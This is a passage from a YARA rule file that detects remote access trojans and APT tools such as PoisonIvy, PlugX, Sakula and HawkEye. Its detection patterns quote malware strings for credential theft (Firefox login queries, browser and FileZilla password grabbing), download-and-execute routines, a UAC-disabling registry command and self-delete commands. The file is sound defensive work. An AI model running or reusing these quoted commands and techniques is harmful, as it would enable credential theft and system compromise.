$v2d = "-CHECK & PING -n 2 127.0.0.1 & EXIT" wide
$v2e = "england.png" wide
$v2f = "Showed Messagebox" wide
condition:
all of ($v1*) or all of ($v2*)
}
rule SSC_jRAT_conf : RAT
{
meta:
description = "jRAT configuration"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-10-11"
filetype = "memory"
version = "1.0"
ref1 = "https://github.com/MalwareLu/config_extractor/blob/master/config_jRAT.py"
ref2 = "http://www.ghettoforensics.com/2013/10/dumping-malware-configuration-data-from.html"
strings:
$a = /port=[0-9]{1,5}SPLIT/
condition:
$a
}
rule SSC_APT17_Sample_FXSST_DLL
{
meta:
description = "Detects Samples related to APT17 activity - file FXSST.DLL"
author = "Florian Roth"
reference = "https://goo.gl/ZiJyQv"
date = "2015-05-14"
hash = "52f1add5ad28dc30f68afda5d41b354533d8bce3"
strings:
$x1 = "Microsoft? Windows? Operating System" fullword wide
$x2 = "fxsst.dll" fullword ascii
$y1 = "DllRegisterServer" fullword ascii
$y2 = ".cSV" fullword ascii
$s1 = "GetLastActivePopup"
$s2 = "Sleep"
$s3 = "GetModuleFileName"
$s4 = "VirtualProtect"
$s5 = "HeapAlloc"
$s6 = "GetProcessHeap"
$s7 = "GetCommandLine"
condition:
uint16(0) == 0x5a4d and filesize < 800KB and ( 1 of ($x*) or all of ($y*) ) and all of ($s*)
}
rule SSC_ZXProxy
{
meta:
author = "ThreatConnect Intelligence Research Team"
strings:
$C = "\\Control\\zxplug" nocase wide ascii
$h = "http://www.facebook.com/comment/update.exe" wide ascii
$S = "Shared a shell to %s:%s Successfully" nocase wide ascii
condition:
any of them
}
rule SSC_zoxPNG_RAT
{
meta:
Author      = "Novetta Advanced Research Group"
Date        = "2014/11/14"
Description = "ZoxPNG RAT, url inside"
Reference   = "http://www.novetta.com/wp-content/uploads/2014/11/ZoxPNG.pdf"
strings:
$url = "png&w=800&h=600&ei=CnJcUcSBL4rFkQX444HYCw&zoom=1&ved=1t:3588,r:1,s:0,i:92&iact=rc&dur=368&page=1&tbnh=184&tbnw=259&start=0&ndsp=20&tx=114&ty=58"
condition:
$url
}
rule SSC_TROJAN_Notepad_shell_crew : Trojan {
meta:
author = "RSA_IR"
Date     = "4Jun13"
File     = "notepad.exe v 1.1"
MD5      = "106E63DBDA3A76BEEB53A8BBD8F98927"
strings:
$s1 = "75BAA77C842BE168B0F66C42C7885997"
$s2 = "B523F63566F407F3834BCC54AAA32524"
condition:
$s1 or $s2
}
rule SSC_TerminatorRat : RAT
{
meta:
description = "Terminator RAT"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-10-24"
filetype = "memory"
version = "1.0"
ref1 = "http://www.fireeye.com/blog/technical/malware-research/2013/10/evasive-tactics-terminator-rat.html"
strings:
$a = "Accelorator"
$b = "<html><title>12356</title><body>"
condition:
all of them
}
rule SSC_shimratreporter: RAT
{
meta:
description = "Detects ShimRatReporter"
author = "Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"
date = "20/11/2015"
ref = "https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/"
strings:
$IpInfo = "IP-INFO"
$NetworkInfo = "Network-INFO"
$OsInfo = "OS-INFO"
$ProcessInfo = "Process-INFO"
$BrowserInfo = "Browser-INFO"
$QueryUserInfo = "QueryUser-INFO"
$UsersInfo = "Users-INFO"
$SoftwareInfo = "Software-INFO"
$AddressFormat = "%02X-%02X-%02X-%02X-%02X-%02X"
$proxy_str = "(from environment) = %s"
$netuserfun = "NetUserEnum"
$networkparams = "GetNetworkParams"
condition:
all of them
}
rule SSC_shimrat: RAT
{
meta:
description = "Detects ShimRat and the ShimRat loader"
author = "Yonathan Klijnsma (yonathan.klijnsma@fox-it.com)"
date = "20/11/2015"
ref = "https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/"
strings:
$dll = ".dll"
$dat = ".dat"
$headersig = "QWERTYUIOPLKJHG"
$datasig = "MNBVCXZLKJHGFDS"
$datamarker1 = "Data$$00"
$datamarker2 = "Data$$01%c%sData"
$cmdlineformat = "ping localhost -n 9 /c %s > nul"
$demoproject_keyword1 = "Demo"
$demoproject_keyword2 = "Win32App"
$comspec = "COMSPEC"
$shim_func1 = "ShimMain"
$shim_func2 = "NotifyShims"
$shim_func3 = "GetHookAPIs"
condition:
($dll and $dat and $headersig and $datasig) or ($datamarker1 and $datamarker2) or ($cmdlineformat and $demoproject_keyword1 and $demoproject_keyword2 and $comspec) or ($dll and $dat and $shim_func1 and $shim_func2 and $shim_func3)
}
rule SSC_Kraken_Bot_Sample : bot {
meta:
description = "Kraken Bot Sample - file inf.bin"
author = "Florian Roth"
reference = "https://blog.gdatasoftware.com/blog/article/dissecting-the-kraken.html"
date = "2015-05-07"
hash = "798e9f43fc199269a3ec68980eb4d91eb195436d"
score = 90
strings:
$s2 = "%s=?getname" fullword ascii
$s4 = "&COMPUTER=^" fullword ascii
$s5 = "xJWFwcGRhdGElAA=" fullword ascii /* base64 encoded string '%appdata%' */
$s8 = "JVdJTkRJUi" fullword ascii /* base64 encoded string '%WINDIR' */
$s20 = "btcplug" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_PythoRAT : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/PythoRAT"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "TKeylogger"
$b = "uFileTransfer"
$c = "TTDownload"
$d = "SETTINGS"
$e = "Unknown" wide
$f = "#@#@#"
$g = "PluginData"
$i = "OnPluginMessage"
condition:
all of them
}
rule SSC_NanoCore : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/NanoCore"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "NanoCore"
$b = "ClientPlugin"
$c = "ProjectData"
$d = "DESCrypto"
$e = "KeepAlive"
$f = "IPNETROW"
$g = "LogClientMessage"
$h = "|ClientHost"
$i = "get_Connected"
$j = "#=q"
$key = {43 6f 24 cb 95 30 38 39}
condition:
6 of them
}
rule SSC_HawkEye : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2015/06"
ref = "http://malwareconfig.com/stats/HawkEye"
maltype = "KeyLogger"
filetype = "exe"
strings:
$key = "HawkEyeKeylogger" wide
$salt = "099u787978786" wide
$string1 = "HawkEye_Keylogger" wide
$string2 = "holdermail.txt" wide
$string3 = "wallet.dat" wide
$string4 = "Keylog Records" wide
$string5 = "<!-- do not script -->" wide
$string6 = "\\pidloc.txt" wide
$string7 = "BSPLIT" wide
condition:
$key and $salt and all of ($string*)
}
rule SSC_PredatorPain : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/PredatorPain"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$string1 = "holderwb.txt" wide
$string3 = "There is a file attached to this email" wide
$string4 = "screens\\screenshot" wide
$string5 = "Disablelogger" wide
$string6 = "\\pidloc.txt" wide
$string7 = "clearie" wide
$string8 = "clearff" wide
$string9 = "emails should be sent to you shortly" wide
$string10 = "jagex_cache\\regPin" wide
$string11 = "open=Sys.exe" wide
$ver1 = "PredatorLogger" wide
$ver2 = "EncryptedCredentials" wide
$ver3 = "Predator Pain" wide
condition:
7 of ($string*) and any of ($ver*)
}
rule SSC_SpyGate : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/SpyGate"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$split = "abccba"
$a1 = "abccbaSpyGateRATabccba" //$a = Version 0.2.6
$a2 = "StubX.pdb"
$a3 = "abccbaDanabccb"
$b1 = "monikerString" nocase //$b = Version 2.0
$b2 = "virustotal1"
$b3 = "get_CurrentDomain"
$c1 = "shutdowncomputer" wide //$c = Version 2.9
$c2 = "shutdown -r -t 00" wide
$c3 = "set cdaudio door closed" wide
$c4 = "FileManagerSplit" wide
$c5 = "Chating With >> [~Hacker~]" wide
condition:
(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))
}
rule SSC_Vertex : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Vertex"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$string1 = "DEFPATH"
$string2 = "HKNAME"
$string3 = "HPORT"
$string4 = "INSTALL"
$string5 = "IPATH"
$string6 = "MUTEX"
$res1 = "PANELPATH"
$res2 = "ROOTURL"
condition:
all of them
}
rule SSC_Ap0calypse: RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Ap0calypse"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "Ap0calypse"
$b = "Sifre"
$c = "MsgGoster"
$d = "Baslik"
$e = "Dosyalars"
$f = "Injecsiyon"
condition:
all of them
}
rule SSC_QRat : RAT
{
meta:
author = "Kevin Breen @KevTheHermit"
date = "2015/08"
ref = "http://malwareconfig.com"
maltype = "Remote Access Trojan"
filetype = "jar"
strings:
$a0 = "e-data"
$a1 = "quaverse/crypter"
$a2 = "Qrypt.class"
$a3 = "Jarizer.class"
$a4 = "URLConnection.class"
condition:
4 of them
}
rule SSC_UPX : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
strings:
$a = "UPX0"
$b = "UPX1"
$c = "UPX!"
condition:
all of them
}
rule SSC_VirusRat : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/VirusRat"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$string0 = "virustotal"
$string1 = "virusscan"
$string2 = "abccba"
$string3 = "pronoip"
$string4 = "streamWebcam"
$string5 = "DOMAIN_PASSWORD"
$string6 = "Stub.Form1.resources"
$string7 = "ftp://{0}@{1}" wide
$string8 = "SELECT * FROM moz_logins" wide
$string9 = "SELECT * FROM moz_disabledHosts" wide
$string10 = "DynDNS\\Updater\\config.dyndns" wide
$string11 = "|BawaneH|" wide
condition:
all of them
}
rule SSC_AAR : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/AAR"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "Hashtable"
$b = "get_IsDisposed"
$c = "TripleDES"
$d = "testmemory.FRMMain.resources"
$e = "$this.Icon" wide
$f = "{11111-22222-20001-00001}" wide
$g = "@@@@@"
condition:
all of them
}
rule SSC_Bandook : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/bandook"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "aaaaaa1|"
$b = "aaaaaa2|"
$c = "aaaaaa3|"
$d = "aaaaaa4|"
$e = "aaaaaa5|"
$f = "%s%d.exe"
$g = "astalavista"
$h = "givemecache"
$i = "%s\\system32\\drivers\\blogs\\*"
$j = "bndk13me"
condition:
all of them
}
rule SSC_Plasma : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Plasma"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "Miner: Failed to Inject." wide
$b = "Started GPU Mining on:" wide
$c = "BK: Hard Bot Killer Ran Successfully!" wide
$d = "Uploaded Keylogs Successfully!" wide
$e = "No Slowloris Attack is Running!" wide
$f = "An ARME Attack is Already Running on" wide
$g = "Proactive Bot Killer Enabled!" wide
$h = "PlasmaRAT" wide ascii
$i = "AntiEverything" wide ascii
condition:
all of them
}
rule SSC_Infinity : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Infinity"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "CRYPTPROTECT_PROMPTSTRUCT"
$b = "discomouse"
$c = "GetDeepInfo"
$d = "AES_Encrypt"
$e = "StartUDPFlood"
$f = "BATScripting" wide
$g = "FBqINhRdpgnqATxJ.html" wide
$i = "magic_key" wide
condition:
all of them
}
rule SSC_BlueBanana : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/BlueBanana"
maltype = "Remote Access Trojan"
filetype = "Java"
strings:
$meta = "META-INF"
$conf = "config.txt"
$a = "a/a/a/a/f.class"
$b = "a/a/a/a/l.class"
$c = "a/a/a/b/q.class"
$d = "a/a/a/b/v.class"
condition:
all of them
}
rule SSC_LuminosityLink : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/LuminosityLink"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "SMARTLOGS" wide
$b = "RUNPE" wide
$c = "b.Resources" wide
$d = "CLIENTINFO*" wide
$e = "Invalid Webcam Driver Download URL, or Failed to Download File!" wide
$f = "Proactive Anti-Malware has been manually activated!" wide
$g = "REMOVEGUARD" wide
$h = "C0n1f8" wide
$i = "Luminosity" wide
$j = "LuminosityCryptoMiner" wide
$k = "MANAGER*CLIENTDETAILS*" wide
condition:
all of them
}
rule SSC_Imminent : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Imminent"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$v1a = "DecodeProductKey"
$v1b = "StartHTTPFlood"
$v1c = "CodeKey"
$v1d = "MESSAGEBOX"
$v1e = "GetFilezillaPasswords"
$v1f = "DataIn"
$v1g = "UDPzSockets"
$v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}
$v2a = "<URL>k__BackingField"
$v2b = "<RunHidden>k__BackingField"
$v2c = "DownloadAndExecute"
$v2d = "-CHECK & PING -n 2 127.0.0.1 & EXIT" wide
$v2e = "england.png" wide
$v2f = "Showed Messagebox" wide
condition:
all of ($v1*) or all of ($v2*)
}
rule SSC_Sub7Nation : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Sub7Nation"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "EnableLUA /t REG_DWORD /d 0 /f"
$b = "*A01*"
$c = "*A02*"
$d = "*A03*"
$e = "*A04*"
$f = "*A05*"
$g = "*A06*"
$h = "#@#@#"
$i = "HostSettings"
$verSpecific1 = "sevane.tmp"
$verSpecific2 = "cmd_.bat"
$verSpecific3 = "a2b7c3d7e4"
$verSpecific4 = "cmd.dll"
condition:
all of them
}
rule SSC_unrecom : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/AAR"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$meta = "META-INF"
$conf = "load/ID"
$a = "load/JarMain.class"
$b = "load/MANIFEST.MF"
$c = "plugins/UnrecomServer.class"
condition:
all of them
}
rule SSC_Arcom : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/Arcom"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a1 = "CVu3388fnek3W(3ij3fkp0930di"
$a2 = "ZINGAWI2"
$a3 = "clWebLightGoldenrodYellow"
$a4 = "Ancestor for '%s' not found" wide
$a5 = "Control-C hit" wide
$a6 = {A3 24 25 21}
condition:
all of them
}
rule SSC_JavaDropper : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2015/10"
ref = "http://malwareconfig.com/stats/AlienSpy"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$jar = "META-INF/MANIFEST.MF"
$a1 = "ePK"
$a2 = "kPK"
$b1 = "config.ini"
$b2 = "password.ini"
$c1 = "stub/stub.dll"
$d1 = "c.dat"
condition:
$jar and (all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*))
}
rule SSC_XLostDoor : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/LostDoor"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}
$a1 = "*mlt* = %"
$a2 = "*ip* = %"
$a3 = "*victimo* = %"
$a4 = "*name* = %"
$b5 = "[START]"
$b6 = "[DATA]"
$b7 = "We Control Your Digital World" wide ascii
$b8 = "RC4Initialize" wide ascii
$b9 = "RC4Decrypt" wide ascii
condition:
all of ($a*) or all of ($b*)
}
rule SSC_BlackNix : RAT
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/BlackNix"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a1 = "SETTINGS" wide
$a2 = "Mark Adler"
$a3 = "Random-Number-Here"
$a4 = "RemoteShell"
$a5 = "SystemInfo"
condition:
all of them
}
rule SSC_ClientMesh : RAT
{
meta:
author = "Kevin Breen <kevin@techanarchy.net>"
date = "2014/06"
ref = "http://malwareconfig.com/stats/ClientMesh"
family = "torct"
strings:
$string1 = "machinedetails"
$string2 = "MySettings"
$string3 = "sendftppasswords"
$string4 = "sendbrowserpasswords"
$string5 = "arma2keyMass"
$string6 = "keylogger"
$conf = {00 00 00 00 00 00 00 00 00 7E}
condition:
all of them
}
rule SSC_ShadowTech
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/ShadowTech"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$a = "ShadowTech" nocase
$b = "DownloadContainer"
$c = "MySettings"
$d = "System.Configuration"
$newline = "#-@NewLine@-#" wide
$split = "pSIL" wide
$key = "ESIL" wide
condition:
4 of them
}
rule SSC_ShadowTech_2
{
meta:
description = "ShadowTech RAT"
author = "botherder https://github.com/botherder"
strings:
$string1 = /\#(S)trings/
$string2 = /\#(G)UID/
$string3 = /\#(B)lob/
$string4 = /(S)hadowTech Rat\.exe/
$string5 = /(S)hadowTech_Rat/
condition:
all of them
}
rule SSC_Anthem_DeepPanda_lot1
{
meta:
description = "Anthem Hack Deep Panda - lot1.tmp-pwdump"
author = "Florian Roth"
date = "2015/02/08"
hash = "5d201a0fb0f4a96cefc5f73effb61acff9c818e1"
strings:
$s0 = "Unable to open target process: %d, pid %d" fullword ascii
$s1 = "Couldn't delete target executable from remote machine: %d" fullword ascii
$s2 = "Target: Failed to load SAM functions." fullword ascii
$s5 = "Error writing the test file %s, skipping this share" fullword ascii
$s6 = "Failed to create service (%s/%s), error %d" fullword ascii
$s8 = "Service start failed: %d (%s/%s)" fullword ascii
$s12 = "PwDump.exe" fullword ascii
$s13 = "GetAvailableWriteableShare returned an error of %ld" fullword ascii
$s14 = ":\\\\.\\pipe\\%s" fullword ascii
$s15 = "Couldn't copy %s to destination %s. (Error %d)" fullword ascii
$s16 = "dump logon session" fullword ascii
$s17 = "Timed out waiting to get our pipe back" fullword ascii
$s19 = "SetNamedPipeHandleState failed, error %d" fullword ascii
$s20 = "%s\\%s.exe" fullword ascii
condition:
10 of them
}
rule SSC_Anthem_DeepPanda_htran_exe
{
meta:
description = "Anthem Hack Deep Panda - htran-exe"
author = "Florian Roth"
date = "2015/02/08"
hash = "38e21f0b87b3052b536408fdf59185f8b3d210b9"
strings:
$s0 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
$s1 = "[-] Gethostbyname(%s) error:%s" fullword ascii
$s2 = "e:\\VS 2008 Project\\htran\\Release\\htran.pdb" fullword ascii
$s3 = "[SERVER]connection to %s:%d error" fullword ascii
$s4 = "-tran  <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
$s5 = "[-] ERROR: Must supply logfile name." fullword ascii
$s6 = "[-] There is a error...Create a new connection." fullword ascii
$s7 = "[+] Accept a Client on port %d from %s" fullword ascii
$s8 = "======================== htran V%s =======================" fullword ascii
$s9 = "[-] Socket Listen error." fullword ascii
$s10 = "[-] ERROR: open logfile" fullword ascii
$s11 = "-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
$s12 = "[+] Make a Connection to %s:%d ......" fullword ascii
$s14 = "Recv %5d bytes from %s:%d" fullword ascii
$s15 = "[+] OK! I Closed The Two Socket." fullword ascii
$s16 = "[+] Waiting another Client on port:%d...." fullword ascii
$s17 = "[+] Accept a Client on port %d from %s ......" fullword ascii
$s20 = "-listen <ConnectPort> <TransmitPort>" fullword ascii
condition:
10 of them
}
rule SSC_Anthem_DeepPanda_sl_txt_packed
{
meta:
description = "Anthem Hack Deep Panda - ScanLine sl-txt-packed"
author = "Florian Roth"
date = "2015/02/08"
hash = "ffb1d8ea3039d3d5eb7196d27f5450cac0ea4f34"
strings:
$s0 = "Command line port scanner" fullword wide
$s1 = "sl.exe" fullword wide
$s2 = "CPports.txt" fullword ascii
$s3 = ",GET / HTTP/.}" fullword ascii
$s4 = "Foundstone Inc." fullword wide
$s9 = " 2002 Foundstone Inc." fullword wide
$s15 = ", Inc. 2002" fullword ascii
$s20 = "ICMP Time" fullword ascii
condition:
all of them
}
rule SSC_Anthem_DeepPanda_Trojan_Kakfum
{
meta:
description = "Anthem Hack Deep Panda - Trojan.Kakfum sqlsrv32.dll"
author = "Florian Roth"
date = "2015/02/08"
hash1 = "ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2"
hash2 = "c6c3bb72896f8f0b9a5351614fd94e889864cf924b40a318c79560bbbcfa372f"
strings:
$s0 = "%SystemRoot%\\System32\\svchost.exe -k sqlserver" fullword ascii
$s1 = "%s\\sqlsrv32.dll" fullword ascii
$s2 = "%s\\sqlsrv64.dll" fullword ascii
$s3 = "%s\\%d.tmp" fullword ascii
$s4 = "ServiceMaix" fullword ascii
$s15 = "sqlserver" fullword ascii
condition:
all of them
}
rule SSC_sakula_v1_4: RAT
{
meta:
description = "Sakula v1.4"
date = "2015-10-13"
author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
strings:
$m1 = "%d_of_%d_for_%s_on_%s"
$m2 = "/c ping 127.0.0.1 & del /q \"%s\""
$m3 = "cmd.exe /c rundll32 \"%s\""
$v1_4 = { 50 E8 CD FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }
$MZ = "MZ"
condition:
$MZ at 0 and all of them
}
rule SSC_sakula_v1_0: RAT
{
meta:
description = "Sakula v1.0"
date = "2015-10-13"
author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
strings:
$m1 = "%d_of_%d_for_%s_on_%s"
$m2 = "/c ping 127.0.0.1 & del /q \"%s\""
$m3 = "=%s&type=%d"
$m4 = "?photoid="
$m5 = "iexplorer"
$m6 = "net start \"%s\""
$v1_1 = "MicroPlayerUpdate.exe"
$MZ = "MZ"
condition:
$MZ at 0 and all of ($m*) and not $v1_1
}
rule SSC_sakula_v1_3: RAT
{
meta:
description = "Sakula v1.3"
date = "2015-10-13"
author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
strings:
$m1 = "%d_of_%d_for_%s_on_%s"
$m2 = "/c ping 127.0.0.1 & del /q \"%s\""
$m3 = "cmd.exe /c rundll32 \"%s\""
$v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }
$MZ = "MZ"
condition:
$MZ at 0 and all of them
}
rule SSC_sakula_v1_1: RAT
{
meta:
description = "Sakula v1.1"
date = "2015-10-13"
author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
strings:
$m1 = "%d_of_%d_for_%s_on_%s"
$m2 = "/c ping 127.0.0.1 & del /q \"%s\""
$m3 = "=%s&type=%d"
$m4 = "?photoid="
$m5 = "iexplorer"
$m6 = "net start \"%s\""
$v1_1 = "MicroPlayerUpdate.exe"
$MZ = "MZ"
condition:
$MZ at 0 and all of them
}
rule SSC_sakula_v1_2: RAT
{
meta:
description = "Sakula v1.2"
date = "2015-10-13"
author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
strings:
$m1 = "%d_of_%d_for_%s_on_%s"
$m2 = "/c ping 127.0.0.1 & del /q \"%s\""
$m3 = "cmd.exe /c rundll32 \"%s\""
$v1_1 = "MicroPlayerUpdate.exe"
$v1_2 = "CCPUpdate"
$MZ = "MZ"
condition:
$MZ at 0 and $m1 and $m2 and $m3 and $v1_2 and not $v1_1
}
rule SSC_poisonivy_1 : rat
{
meta:
description = "Poison Ivy"
author = "Jean-Philippe Teissier / @Jipe_"
date = "2013-02-01"
filetype = "memory"
version = "1.0"
ref1 = "https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py"
strings:
$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C 6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63 74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C }
condition:
$a
}
rule SSC_PoisonIvy_2
{
meta:
author = " Kevin Breen <kevin@techanarchy.net>"
date = "2014/04"
ref = "http://malwareconfig.com/stats/PoisonIvy"
maltype = "Remote Access Trojan"
filetype = "exe"
strings:
$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}
$string1 = "CONNECT %s:%i HTTP/1.0"
$string2 = "ws2_32"
$string3 = "cks=u"
$string4 = "thj@h"
$string5 = "advpack"
condition:
$stub at 0x1620 and all of ($string*) or (all of them)
}
rule SSC_PoisonIvy_Generic_3 {
meta:
description = "PoisonIvy RAT Generic Rule"
author = "Florian Roth"
date = "2015-05-14"
hash = "e1cbdf740785f97c93a0a7a01ef2614be792afcd"
strings:
$k1 = "Tiger324{" fullword ascii
$s2 = "WININET.dll" fullword ascii
$s3 = "mscoree.dll" fullword wide
$s4 = "WS2_32.dll" fullword
$s5 = "Explorer.exe" fullword wide
$s6 = "USER32.DLL"
$s7 = "CONOUT$"
$s8 = "login.asp"
$h1 = "HTTP/1.0"
$h2 = "POST"
$h3 = "login.asp"
$h4 = "check.asp"
$h5 = "result.asp"
$h6 = "upload.asp"
condition:
uint16(0) == 0x5a4d and filesize < 500KB and
(
$k1 or all of ($s*) or all of ($h*)
)
}
rule SSC_rtf_Kaba_jDoe
{
meta:
author = "@patrickrolsen"
maltype = "APT.Kaba"
filetype = "RTF"
version = "0.1"
description = "fe439af268cd3de3a99c21ea40cf493f, d0e0e68a88dce443b24453cc951cf55f, b563af92f144dea7327c9597d9de574e, and def0c9a4c732c3a1e8910db3f9451620"
date = "2013-12-10"
strings:
$magic1 = { 7b 5c 72 74 30 31 } // {\rt01
$magic2 = { 7b 5c 72 74 66 31 } // {\rtf1
$magic3 = { 7b 5c 72 74 78 61 33 } // {\rtxa3
$author1 = { 4A 6F 68 6E 20 44 6F 65 } // "John Doe"
$author2 = { 61 75 74 68 6f 72 20 53 74 6f 6e 65 } // "author Stone"
$string1 = { 44 30 [16] 43 46 [23] 31 31 45 }
condition:
($magic1 or $magic2 or $magic3 at 0) and all of ($author*) and $string1
}
rule SSC_PlugXStrings : PlugX Family
{
meta:
description = "PlugX Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-12"
strings:
$BootLDR = "boot.ldr" wide ascii
$Dwork = "d:\\work" nocase
$Plug25 = "plug2.5"
$Plug30 = "Plug3.0"
$Shell6 = "Shell6"
condition:
$BootLDR or ($Dwork and ($Plug25 or $Plug30 or $Shell6))
}
rule SSC_plugX : rat
{
meta:
author = "Jean-Philippe Teissier / @Jipe_"
description = "PlugX RAT"
date = "2014-05-13"
filetype = "memory"
version = "1.0"
ref1 = "https://github.com/mattulm/IR-things/blob/master/volplugs/plugx.py"
strings:
$v1a = { 47 55 4C 50 00 00 00 00 }
$v1b = "/update?id=%8.8x"
$v1algoa = { BB 33 33 33 33 2B }
$v1algob = { BB 44 44 44 44 2B }
$v2a = "Proxy-Auth:"
$v2b = { 68 A0 02 00 00 }
$v2k = { C1 8F 3A 71 }
condition:
$v1a at 0 or $v1b or (($v2a or $v2b) and (($v1algoa and $v1algob) or $v2k))
}
rule SSC_PlugX_mw
{
meta:
maltype = "plugX"
author = "https://github.com/reed1713"
reference = "http://www.fireeye.com/blog/technical/targeted-attack/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html"
description = "Malware creates a randomized directory within the appdata roaming directory and launches the malware. Should see multiple events for create process rundll32.exe and iexplorer.exe as it repeatedly uses iexplorer to launch the rundll32 process."
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="4688"
$data=/\\AppData\\Roaming\\[0-9]{9,12}\VMwareCplLauncher\.exe/
$type1="Microsoft-Windows-Security-Auditing"
$eventid1="4688"
$data1="\\Windows\\System32\\rundll32.exe"
$type2="Microsoft-Windows-Security-Auditing"
$eventid2="4688"
$data2="Program Files\\Internet Explorer\\iexplore.exe"
condition:
all of them
}
rule SSC_RAT_Orcus
{
meta:
